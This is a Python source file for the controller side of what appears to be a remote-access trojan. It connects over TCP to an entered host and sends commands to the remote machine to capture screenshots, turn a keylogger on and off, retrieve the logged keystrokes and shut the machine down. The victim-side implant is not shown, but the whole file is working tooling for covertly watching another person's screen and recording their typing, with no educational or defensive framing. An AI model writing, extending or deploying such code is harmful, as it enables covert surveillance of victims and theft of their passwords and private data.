import socket
from PIL import Image
import io

HEADER = 64
PORT = 5050
SERVER = input("Enter host IP: ")
FORMAT = 'utf-8'
DISCONNECT_MSG = "!DISCONNECT"
SCREENSHOT_MSG = "!SCREENSHOT"
SHUTDOWN_MSG = "!SHUTDOWN"
KEYLOG_MSG = "!KEYLOG"

keylog_on = False

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((SERVER, PORT))

def send(msg):
    message = msg.encode(FORMAT)
    msg_len = str(len(message)).encode(FORMAT) 
    msg_len += (b' '*(HEADER - len(msg_len)))
    client.send(msg_len)
    client.send(message)

def receive_screenshot():
    length = int(client.recv(HEADER).decode(FORMAT))
    screenshot_bytes = b''
    while length > 0:
        data = client.recv(min(length, 4096))
        if not data:
            break
        screenshot_bytes += data
        length -= len(data)
    return screenshot_bytes

def display_screenshot(image_bytes):
    if not image_bytes:
        print("Error: No screenshot data received.")
        return
    image_streamIO = io.BytesIO(image_bytes)
    image_streamIO.seek(0)
    image = Image.open(image_streamIO)
    image.show()

def receive():
    msg_len = client.recv(HEADER).decode(FORMAT)
    if msg_len:
        msg_len = int(msg_len)
        msg = client.recv(msg_len).decode(FORMAT)
        return msg
    return ""

def start():
    while True:
        msg = input("Enter a message (type '!SCREENSHOT' to request a screenshot or '!DISCONNECT' to quit): ")
        global keylog_on
        if msg == DISCONNECT_MSG or msg == SHUTDOWN_MSG:
            send(msg)
            break
        elif msg == SCREENSHOT_MSG:
            send(SCREENSHOT_MSG)
            screenshot_data = receive_screenshot()
            display_screenshot(screenshot_data)
        elif msg == KEYLOG_MSG:
            if not keylog_on:
                keylog_on = True
                send(msg)
            else:
                send(msg)
                keylog_on = False
                print(f"Keylog: {receive()}")
        else:
            send(msg)

start()